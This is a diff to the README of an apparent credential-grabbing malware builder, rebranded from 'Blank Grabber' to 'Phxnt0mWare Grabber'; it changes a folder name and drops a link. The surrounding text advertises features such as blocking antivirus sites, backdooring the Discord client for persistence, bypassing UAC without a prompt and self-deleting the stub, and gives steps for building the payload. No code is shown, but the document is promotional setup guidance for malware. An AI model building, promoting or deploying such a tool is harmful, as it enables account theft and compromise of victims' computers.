@@ -79,7 +79,7 @@
 | **Melt Stub** | Deletes the stub after use. |
 | **Pump Stub** | Pumps the stub upto the provided size. |
 | **Fake Error** | Create custom (fake) error. |
-| **Block AV Sites** | Blocks AV related sites ([Unblock](https://github.com/Blank-c/Blank-Grabber/issues/117)). |
+| **Block AV Sites** | Blocks AV related sites |
 | **Discord Injection** | Puts backdoor on the Discord client for persistence. |
 | **UAC Bypass** | Tries to get administrator permissions without showing any prompt. |
 
@@ -111,5 +111,5 @@
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
 3. [Download Phxnt0mWare Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
-5. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
+5. Navigate to the **Phxnt0mWare** folder and double click *Builder.bat* file.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
